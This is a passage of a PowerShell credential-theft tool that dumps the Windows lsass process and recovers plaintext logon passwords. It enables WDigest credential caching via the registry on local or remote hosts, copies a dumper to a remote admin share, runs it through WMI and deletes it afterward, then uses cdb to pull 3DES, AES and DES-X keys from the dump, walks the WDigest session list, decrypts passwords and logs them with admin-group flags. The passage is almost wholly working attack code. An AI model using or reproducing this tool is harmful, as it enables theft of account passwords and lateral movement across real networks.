    }
    else {
        if($dump -eq "gen") { 
            $operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
            $osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        }
    }
    if($operatingSystem -eq "5.1.2600" -or $operatingSystem -eq "5.2.3790"){
        $mode = 3
    }
    else {
        if($operatingSystem -eq "6.1.7601" -or $operatingSystem -eq "6.1.7600"){
            if($osArchitecture -eq "64 bits" -or $osArchitecture -eq "64-bit") {
                $mode = 1
            }
            else {
                $mode = 132
            }
        }
        else {
            if($operatingSystem -eq "6.2.9200"){
                $mode = 2
            }
            else{
                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240" -or $operatingSystem -eq "10.0.10514"){    
                    $mode = "2r2"
                }
                else {
                    Write-Output "The operating system could not be determined... terminating..."
                    Stop-Script 
                }
            }
        }
    }
}

if($mode -eq "2r2") {
    $CdbProgramPath = "$scriptPath\debugger\2r2\cdb.exe"
<#________________________________________________________________________

Manage wdigest protocol in registry (local and remote if needed)
__________________________________________________________________________#>

    if($dump -eq "" -or $dump -eq "gen") {
        $parentKey = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
        $nameRegistryKey = "UseLogonCredential"
        $valueRegistryKey = "1"
        if(!(Get-ItemProperty -Path $parentKey -Name $nameRegistryKey -ErrorAction SilentlyContinue)){                  
            New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null            
            Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
            Stop-Script
        }
        else {
            $valueSetted = (Get-ItemProperty -Path  $parentKey  -Name $nameRegistryKey).$nameRegistryKey
            if($valueSetted -ne 1) {
                New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null
                Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
                Stop-Script
            }
        }
    }
    else {
        $parentKey = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
        $nameRegistryKey = "UseLogonCredential"
        $valueRegistryKey = "1"

        $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $server)
        $objRegKey= $objReg.OpenSubKey($parentKey)
        $test = $objRegkey.GetValue($nameRegistryKey)
        if($test -eq $null){    
            Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
            Stop-Script
        }
        else {
            if($test -ne 1){
                Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
                Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
                Stop-Script
            }
        }
    }

}
else {
    $CdbProgramPath = "$scriptPath\debugger\pre2r2\cdb.exe"
}

<#________________________________________________________________________

    Set the environment for the symbols
__________________________________________________________________________#>

#SRV*c:\symbols*http://msdl.microsoft.com/download/symbols
Write-Progress -Activity "Setting environment" -status "Running..." -id 1
Set-SymbolServer -CacheDirectory C:\symbols\public -Public -SymbolServers http://msdl.microsoft.com/download/symbols -CurrentEnvironmentOnly
Write-Progress -Activity "Environment setted" -status "Running..." -id 1
Write-Progress -Activity "Creating msdsc log" -status "Running..." -id 1
if($dump -eq "gen"){
    if($mode -eq "2r2") {
        $dumpAProcessPath = "$scriptPath\msdsc.exe"
        &$dumpAProcessPath "lsass" "$logDirectoryPath"
    }
    else {
        $process = Get-Process lsass 
        Write-Minidump $process $logDirectoryPath
    }
}
else {
    if($dump -eq ""){
    $computername = $Server
      # To disable UAC remote (need a reboot)
      <#
        $parentKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
        $nameRegistryKey = "LocalAccountTokenFilterPolicy"
        $valueRegistryKey = "1"

        $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $server)
        $objRegKey= $objReg.OpenSubKey($parentKey)
        $test = $objRegkey.GetValue($nameRegistryKey)
        if($test -eq $null){    
            Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
            Stop-Script
        }
        else {
            if($test -ne 1){
                Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
                Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
                Stop-Script
            }
        }
        #>
        Copy-Item -Path "$scriptPath\msdsc.exe" -Destination "\\$computername\c$\windows\temp\msdsc.exe"
        $dumpAProcessPath = "C:\Windows\temp\msdsc.exe"
        Run-WmiRemoteProcess $computername "$dumpAProcessPath lsass c:\windows\temp" | Wait-Process
        Start-Sleep -Seconds 15
        Copy-Item -Path "\\$computername\\c$\windows\temp\lsass.dmp" -Destination "$logDirectoryPath"
        Remove-Item -Force "\\$computername\c$\windows\temp\msdsc.exe"
        Remove-Item -Force "\\$computername\c$\windows\temp\lsass.dmp"        
        Write-Progress -Activity "msdsc log created" -status "Running..." -id 1
    }
    else {
        $file = $dump #\lsass.dmp"
    }
}
   
if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
    <#________________________________________________________________________

        Get the triple DES key in the lsass dump memory file
    __________________________________________________________________________#> 
    Write-Progress -Activity "Getting Triple DES Key" -status "Running..." -id 1

    $h3DesKeyCommand = "dd lsasrv!h3DesKey"    
    [io.file]::WriteAllText($DebuggingScript, $h3DesKeyCommand) | Out-Null
    $h3 = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"     

    $arrayFirstAddress = ($h3 -split ' ')            
    $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
    $firstAddress1 = $arrayFirstAddress[$foundInstruction]    
    $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
    $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
    $firstAddress = "$firstAddress2$firstAddress1"        

    $firstAddressCommand = "dd $firstAddress"    
    [io.file]::WriteAllText($DebuggingScript, $firstAddressCommand) | Out-Null
    $ddSecond = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
    
    $arraySecondAddress = ($ddSecond -split ' ')     
    if($mode -eq 132) { 
        $start = 20
        $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 7
        $secondAddress1 = $arraySecondAddress[$foundInstruction]      
        $secondAddress = "$secondAddress1"   
    }   
    else {
        $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 10
        $secondAddress1 = $arraySecondAddress[$foundInstruction]    
        $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 11
        $secondAddress2 = $arraySecondAddress[$foundInstruction]    
        $secondAddress = "$secondAddress2$secondAddress1"   
    }
    
    $secondAddressCommand = "dw $secondAddress"    
    [io.file]::WriteAllText($DebuggingScript, $secondAddressCommand) | Out-Null
    $thirdAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"        
          
    $arrayThirdAddress = ($thirdAddress -split ' ')  
        
    if($mode -eq 1) { $start = 20}
    if($mode -eq 2) { $start = 30}
    if($mode -eq "2r2") { $start = 40}

    $passAddress1 = ""
    $j = 0
    $keyAddress = ""
    while($j -le 11) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else {        
            if($j -eq 2 -or $j -eq 10) { # pour passer à la ligne suivante des valeurs
                $value = $value+3
                $comma = ", "
            }
            else {
                $value++
                $comma = ", "
            }
        }
        $foundInstruction = [array]::indexof($arrayThirdAddress,"dw") + $value
        $keyAddress2 = $arrayThirdAddress[$foundInstruction].Substring(0,2)
        $keyAddress1 = $arrayThirdAddress[$foundInstruction].Substring(2,2)           
        $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"
        $j++
    }        
    $tripleDESKeyHex = $keyAddress           
    <#________________________________________________________________________

        Get the AES key in the lsass dump memory file
    __________________________________________________________________________#> 
    Write-Progress -Activity "Getting AES Key" -status "Running..." -id 1

    $hAesKeyCommand = "dd lsasrv!hAesKey"      
    [io.file]::WriteAllText($DebuggingScript, $hAesKeyCommand) | Out-Null    
    $h = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
     
    $arrayFirstAddress = ($h -split ' ')    
    $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
    $firstAddress1 = $arrayFirstAddress[$foundInstruction]    
    $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
    $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
    $firstAddress = "$firstAddress2$firstAddress1"        

    $firstAddressCommand = "dd $firstAddress" 
    [io.file]::WriteAllText($DebuggingScript, $firstAddressCommand) | Out-Null  
    $ddSecond = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
    
    $arraySecondAddress = ($ddSecond -split ' ')        
    $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 10
    $secondAddress1 = $arraySecondAddress[$foundInstruction]    
    $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 11
    $secondAddress2 = $arraySecondAddress[$foundInstruction]    
    $secondAddress = "$secondAddress2$secondAddress1"       

    
    $secondAddressCommand = "dw $secondAddress" 
    [io.file]::WriteAllText($DebuggingScript, $secondAddressCommand) | Out-Null  
    $thirdAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"              
    
    $arrayThirdAddress = ($thirdAddress -split ' ')  
    
    if($mode -eq 1) { $start = 20}
    if($mode -eq 2) { $start = 30}

    $passAddress1 = ""
    $j = 0
    $keyAddress = ""
    while($j -le 7) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else {        
            if($j -eq 2) { # pour passer à la ligne suivante des valeurs
                $value = $value+3
                $comma = ", "
            }
            else {
                $value++
                $comma = ", "
            }
        }
        $foundInstruction = [array]::indexof($arrayThirdAddress,"dw") + $value
        $keyAddress2 = $arrayThirdAddress[$foundInstruction].Substring(0,2)
        $keyAddress1 = $arrayThirdAddress[$foundInstruction].Substring(2,2)           
        $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"
        $j++
    }        
    $hAesKeyHex = $keyAddress       
    <#________________________________________________________________________

        Get the initialization vector in the lsass dump memory file
    __________________________________________________________________________#> 
    Write-Progress -Activity "Getting Initialization Vector" -status "Running..." -id 1                 

    $initializationVectorCommand = "db lsasrv!InitializationVector"      
    [io.file]::WriteAllText($DebuggingScript, $initializationVectorCommand) | Out-Null  
    $initializationVector = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
    $arrayInitializationVector = ($initializationVector -split ' ')    
    
    if($mode -eq 1 -or $mode -eq 132) { $start = 20}
    if($mode -eq 2) { $start = 30}

    $j = 0
    $initializationVectorAddress = ""
    $start = 4
    while($j -le 7) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else {        
            $value++
            $comma = ", "        
        }
        $foundInstruction = [array]::indexof($arrayInitializationVector,"db") + $value   
        if($j -eq 7) {
            $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction].Substring(0,2)
        }
        else {
            $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction]
        }
        $initializationVectorAddress += "$comma"+"0x$initializationVectorAddress1"
        $j++
    }   
    $initializationVectorHex = $initializationVectorAddress    
    <#________________________________________________________________________

        Get the login and password in the lsass dump memory file
        We use the double linked list l_LogSessList used by SpAcceptCredentials 
        to store password it receives in args in clear
        This password is protected by LsaProtectMemory 
        In l_LogSessList, we can retrieve Login (clear), Domain(clear) and 
        Password (not clear)
    __________________________________________________________________________#> 
    Write-Progress -Activity "Getting first address of the list" -status "Running..." -id 1    

    $wdigest = "dd wdigest!l_LogSessList"      
    [io.file]::WriteAllText($DebuggingScript, $wdigest) | Out-Null      
    $wdigest = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"    
    
    $firstAddress = ""

    $arrayFirstAddress = ($wdigest -split ' ')    
    if($mode -eq 132) {
        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
        $firstAddress1 = $arrayFirstAddress[$foundInstruction]
        $firstAddress = "$firstAddress1" 
    }
    else {
        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
        $firstAddress1 = $arrayFirstAddress[$foundInstruction]
        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
        $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
        $firstAddress = "$firstAddress2$firstAddress1" 
    }
    <#________________________________________________________________________

        We find the first address of the list and loop until we reach it again
    __________________________________________________________________________#> 
    $firstAddressList = $firstAddress
    $nextEntry = ""
    $i = 0
    while ($firstAddressList -ne $nextEntry <#-and $i -le 2#>) {
        if($i -eq 0) {
            $nextEntry = $firstAddress            
            $command = "dd $firstAddress"
        }
        else {            
            $command = "dd $nextEntry"
        }
          
        [io.file]::WriteAllText($DebuggingScript, $command) | Out-Null              
        $ddSecond = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 

        # Next entry in the list
        if($mode -eq 132) {
            if($i -eq 0) {
                $firstAddress = $firstAddress               
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]        
                $nextEntry = "$nextEntry1"                   
            }
            else {        
                $firstAddress = $nextEntry
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]         
                $nextEntry = "$nextEntry1"                
            }   
        }
        else {
            if($i -eq 0) {
                $firstAddress = $firstAddress               
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 5
                $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                $nextEntry = "$nextEntry2$nextEntry1"                   
            }
            else {        
                $firstAddress = $nextEntry
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 5
                $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                $nextEntry = "$nextEntry2$nextEntry1"                
            } 
        }   

        # Login
        Write-Progress -Activity "Getting logging information" -status "Running..." -id 1
        
        $arrayLoginAddress = ($ddSecond -split ' ')           
        if($mode -eq 1) { $start = 48}
        if($mode -eq 132) { $start = 17}
        if($mode -eq 2 -or $mode -eq "2r2") { $start = 24}
         
        $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start
        $loginAddress1 = $arrayLoginAddress[$foundInstruction] 
        $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start + 1
        $loginAddress2 = $arrayLoginAddress[$foundInstruction]    
        $loginAddress = "$loginAddress2$loginAddress1"                                           

        if($loginAddress -eq "0000000000000000"){
            $start = 24
            $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start
            $loginAddress1 = $arrayLoginAddress[$foundInstruction]       
            $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start + 1
            $loginAddress2 = $arrayLoginAddress[$foundInstruction]      
            $loginAddress = "$loginAddress2$loginAddress1"                                                    
        }
                  
        $loginAddressCommand = "du $loginAddress"      
        [io.file]::WriteAllText($DebuggingScript, $loginAddressCommand) | Out-Null                                             
        $loginDB = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"   
        $arrayloginDBAddress = ($loginDB -split ' ')            

        $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
        $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]

        $loginPlainText = $loginPlainText1 -replace """",""                                     
        if ((gwmi win32_computersystem).partofdomain -eq $true) {
            $user = ""
            if(![string]::IsNullOrEmpty($loginPlainText)) {
	            $user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}
	            if(![string]::IsNullOrEmpty($user)) {
	                $user = $user.DistinguishedName   
	                $enterpriseAdminsFlag = "false"
	                $schemaAdminsFlag = "false"
	                $domainAdminFlag = "false"
	                $administratorsFlag = "false"
	                $backupOperatorsFlag = "false"
	                if($enterpriseAdmins -ne ""){
	                    $enterpriseAdminsFlag = $enterpriseAdmins.Contains($user)
	                    if($enterpriseAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Enterprise Admins"}
	                }
	                if($schemaAdmins -ne ""){
	                    $schemaAdminsFlag = $schemaAdmins.Contains($user)
	                    if($schemaAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Schema Admins"}
	                }
	                $domainAdminFlag = $domainAdmins.Contains($user)
	                if($domainAdminFlag -eq "true") {$loginPlainText = $loginPlainText + " = Domain Admin"}
	                $administratorsFlag = $administrators.Contains($user)
	                if($administratorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Administrators"}
	                $backupOperatorsFlag = $backupOperators.Contains($user)
	                if($backupOperatorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Backup Operators"}            
	            }
            }
        }
        # Password
        Write-Progress -Activity "Getting password information" -status "Running..." -id 1         
        $arraySecondAddress = ($ddSecond -split ' ')    
        if($mode -eq 132) { $start = 22}
        else {$start = 34}
        $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + $start
        $lengthPassword = $arraySecondAddress[$foundInstruction]
        $lengthPassword = $lengthPassword.Substring(6,2)    
        <#
            La taille du mot de passe est codée en hexa -> on convertit en décimal 
            (ex. 1c devient 28, ce qui veut dire que le mot de passe est codé sur 28 bytes = 14 lettres chiffrées)
            on divise par 8 bytes (taille minimale du cypher) et on arrondit au dessus -> nous avons donc besoin de 4 pack de 8 bytes 
            au minimum pour y placer nos 28 bytes d'informations, c'est pour cela que l'on multiplie par 4 
            (avec 3, on n'aurait que 24 bytes pour placer nos 28 bytes)         
            Ici le résultat sera 14, soit 14 lettres possibles, on va donc itérer 14 fois et prendre
            chacune des paires de valeurs qui sont ici significatives             
        #>        
        $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lengthPassword,16)/8) * 4    
        
        if($mode -eq 132) {
            $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 23
            $secondAddress1 = $arraySecondAddress[$foundInstruction]     
            $secondAddress = "$secondAddress1" 
        }
        else {
            $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 36
            $secondAddress1 = $arraySecondAddress[$foundInstruction]  
            $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 37
            $secondAddress2 = $arraySecondAddress[$foundInstruction]    
            $secondAddress = "$secondAddress2$secondAddress1"        
        }
        
        $secondAddressCommand = "dw $secondAddress"      
        [io.file]::WriteAllText($DebuggingScript, $secondAddressCommand) | Out-Null                                                                                                
        $passAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"                          
        $arrayPasAddress = ($passAddress -split ' ')          
        
        $passAddress1 = ""
        $passAddress2 = ""
        $j = 1
        $modJ = $j
        $begin = 4
        $stringPasswordHex = ""
        while($j -le $numberBytes -and $j -le 64) {        
            if($j -eq 1) {
                $value = $begin
                $comma = ""
            }
            else {
                $goNextLine = $modJ%9            
                if($goNextLine -eq 0) { # pour passer à la ligne suivante des valeurs
                    $value = $value+3
                    $comma = ", "
                    $modJ++
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            $foundInstruction = [array]::indexof($arrayPasAddress,"dw") + $value                
            $passAddress2 = $arrayPasAddress[$foundInstruction].Substring(0,2)
            $passAddress1 = $arrayPasAddress[$foundInstruction].Substring(2,2)            
            $stringPasswordHex += "$comma"+"0x$passAddress1, 0x$passAddress2"
            $j++
            $modJ++
        }        
        $passwordHex = $stringPasswordHex                            
        Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText"           
        if(($numberBytes % 8)) {        
            #$password = Get-DecryptAESPassword $passwordHex $hAesKeyHex $initializationVectorHex
            $password = Get-DecryptTripleDESPassword $passwordHex $tripleDESKeyHex $initializationVectorHex
        }
        else {        
            $password = Get-DecryptTripleDESPassword $passwordHex $tripleDESKeyHex $initializationVectorHex
        }        
        Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
        $i++
    }
}
else {    
    if($mode -eq 3) {
         <#________________________________________________________________________

            Get the DES-X key in the lsass dump memory file
        __________________________________________________________________________#> 
        Write-Progress -Activity "Getting DES-X Key" -status "Running..." -id 1

        $h3DesKeyCommand = "dd lsasrv!g_pDesXKey"                     
        [io.file]::WriteAllText($DebuggingScript, $h3DesKeyCommand) | Out-Null                                                                                                        
        $desX = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
     
        $arrayFirstAddress = ($desX -split ' ')    
        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
        $firstAddress1 = $arrayFirstAddress[$foundInstruction]    
        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
        $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
        $firstAddress = "$firstAddress2$firstAddress1"         

        $desXAddressCommand = "dw /c 96 $firstAddress L48"                     
        [io.file]::WriteAllText($DebuggingScript, $desXAddressCommand) | Out-Null                                                                                                                
        $desXAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"                      

        $arrayDesXAddressAddress = ($desXAddress -split ' ')                              
        $passAddress1 = ""
        $j = 0
        $start = 7
        $keyAddress = ""
        while($j -le 71) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = " "                
            }            
            $foundInstruction = [array]::indexof($arrayDesXAddressAddress,"dw") + $value                        
            $keyAddress2 = $arrayDesXAddressAddress[$foundInstruction].Substring(0,2)                      
            $keyAddress1 = $arrayDesXAddressAddress[$foundInstruction].Substring(2,2)                                  
            $keyAddress += "$keyAddress1$keyAddress2"
            $j++
        }                 
        $DESXKeyHex = $keyAddress   
        <#________________________________________________________________________

        Get the Feedback in the lsass dump memory file
        __________________________________________________________________________#> 
        Write-Progress -Activity "Getting Initialization Vector" -status "Running..." -id 1

        $initializationVectorCommand = "db lsasrv!g_Feedback"                  
        [io.file]::WriteAllText($DebuggingScript, $initializationVectorCommand) | Out-Null                                                                                                                                      
        $initializationVector = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 

        $arrayInitializationVector = ($initializationVector -split ' ')    

        $j = 0
        $initializationVectorAddress = ""
        $start = 4
        while($j -le 7) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = ", "        
            }
            $foundInstruction = [array]::indexof($arrayInitializationVector,"db") + $value   
            if($j -eq 7) {
                $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction].Substring(0,2)
            }
            else {
                $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction]
            }
            $initializationVectorAddress += "$initializationVectorAddress1"
            $j++
        }   

        $g_Feedback = $initializationVectorAddress        
        
        $Encoding = [System.Text.Encoding]::GetEncoding("windows-1252")

        $hexarray = $g_Feedback -split '(.{2})' | ? {$_}
        $hexcount = $hexarray.count
        $loopcount = 0
        $g_Feedback = ""
        while ($loopcount -le $hexcount -1) {
            $currenthex = $hexarray[$loopcount]          
            $dec = [Convert]::ToInt32($currenthex,16)    
            $String = $Encoding.GetString($dec)
            $conversion = [Char][Convert]::ToInt32($currenthex,16)    
            $g_Feedback = $g_Feedback + $String
            $loopcount = $loopcount + 1
        }        
        $hexarray = $DESXKeyHex -split '(.{2})' | ? {$_}
        $hexcount = $hexarray.count
        $loopcount = 0
        $DESXKeyHex = ""
        while ($loopcount -le $hexcount -1) {
            $currenthex = $hexarray[$loopcount]          
            $dec = [Convert]::ToInt32($currenthex,16)    
            $String = $Encoding.GetString($dec)
            $conversion = [Char][Convert]::ToInt32($currenthex,16)    
            $DESXKeyHex = $DESXKeyHex + $String
            $loopcount = $loopcount + 1
        }

        Write-Progress -Activity "Getting first address of the list" -status "Running..." -id 1   

        $wdigestCommand = "dd wdigest!l_LogSessList"                  
        [io.file]::WriteAllText($DebuggingScript, $wdigestCommand) | Out-Null                                                                                                                                                    
        $wdigest = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"        

        $firstAddress = ""
        $arrayFirstAddress = ($wdigest -split ' ')    
        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
        $firstAddress1 = $arrayFirstAddress[$foundInstruction]
        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
        $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
        $firstAddress = "$firstAddress2$firstAddress1"         
        <#________________________________________________________________________

        We find the first address of the list and loop until we reach it again
        __________________________________________________________________________#> 
        $firstAddressList = $firstAddress
        $nextEntry = ""
        $i = 0
        while ($firstAddressList -ne $nextEntry) {
            if($i -eq 0) {
                $nextEntry = $firstAddress                
                $command = "dd $firstAddress"  
            }
            else {                 
                $command = "dd $nextEntry"    
            }
                          
            [io.file]::WriteAllText($DebuggingScript, $command) | Out-Null                                                                                                                                                                
            $ddSecond = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 

            # Next entry in the list
            if($i -eq 0) {
                $firstAddress = $firstAddress               
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 5
                $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                $nextEntry = "$nextEntry2$nextEntry1"                   
            }
            else {        
                $firstAddress = $nextEntry
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 5
                $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                $nextEntry = "$nextEntry2$nextEntry1"                
            }    

            # Login
            Write-Progress -Activity "Getting logging information" -status "Running..." -id 1        
            $arrayLoginAddress = ($ddSecond -split ' ')           
            $start = 28                     
            $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start
            $loginAddress1 = $arrayLoginAddress[$foundInstruction]             
            $loginAddress = "$loginAddress1"                            

            if($loginAddress -eq "00000000"){
                $start = 16                     
                $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start
                $loginAddress1 = $arrayLoginAddress[$foundInstruction]             
                $loginAddress = "$loginAddress1"    
                
                $loginAddressCommand = "du $loginAddress"                  
                [io.file]::WriteAllText($DebuggingScript, $loginAddressCommand) | Out-Null
                $loginDB = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"

                $arrayloginDBAddress = ($loginDB -split ' ')            
                $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
                $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
                $loginPlainText = $loginPlainText1
            }
            else {                
                $loginAddressCommand = "du $loginAddress"                  
                [io.file]::WriteAllText($DebuggingScript, $loginAddressCommand) | Out-Null
                $loginDB = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"
                                
                $arrayloginDBAddress = ($loginDB -split ' ')            
                $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
                $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
                $loginPlainText = $loginPlainText1
            }     

            # Password
            Write-Progress -Activity "Getting password information" -status "Running..." -id 1         
            $arrayPasswordAddress = ($ddSecond -split ' ')                            
            $foundInstruction = [array]::indexof($arrayPasswordAddress,"dd") + 19
            $lengthPassword = $arrayPasswordAddress[$foundInstruction]
            $lengthPassword = $lengthPassword.Substring(6,2)        
            $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lengthPassword,16)/8) * 4                
            $foundInstruction = [array]::indexof($arrayPasswordAddress,"dd") + 22
            $secondAddress1 = $arrayPasswordAddress[$foundInstruction]                
            $secondAddress = "$secondAddress1"   
            
            $secondAddressCommand = "dw $secondAddress"                  
            [io.file]::WriteAllText($DebuggingScript, $secondAddressCommand) | Out-Null                                                                           
            $passAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"                   
                   
            $arrayPasAddress = ($passAddress -split ' ')                  
            $passAddress1 = ""
            $passAddress2 = ""
            $j = 1
            $modJ = $j
            $begin = 4
            $stringPasswordHex = ""
            while($j -le $numberBytes -and $j -le 64) {        
                if($j -eq 1) {
                    $value = $begin
                    $comma = ""
                }
                else {
                    $goNextLine = $modJ%9            
                    if($goNextLine -eq 0) { # pour passer à la ligne suivante des valeurs
                        $value = $value+3
                        $comma = ", "
                        $modJ++
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                $foundInstruction = [array]::indexof($arrayPasAddress,"dw") + $value                
                $passAddress2 = $arrayPasAddress[$foundInstruction].Substring(0,2)
                $passAddress1 = $arrayPasAddress[$foundInstruction].Substring(2,2)            
                $stringPasswordHex += "$passAddress1$passAddress2"
                $j++
                $modJ++
            }        

            $passwordHex = $stringPasswordHex                            
            Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText"                        
            $cipherToDecrypt = $passwordHex                      
            $hexarray = $cipherToDecrypt -split '(.{2})' | ? {$_}
            if($hexarray){
                $hexcount = $hexarray.count
                $loopcount = 0
                $cipherToDecrypt = ""
                while ($loopcount -le $hexcount -1) {
                    $currenthex = $hexarray[$loopcount]          
                    $dec = [Convert]::ToInt32($currenthex,16)    
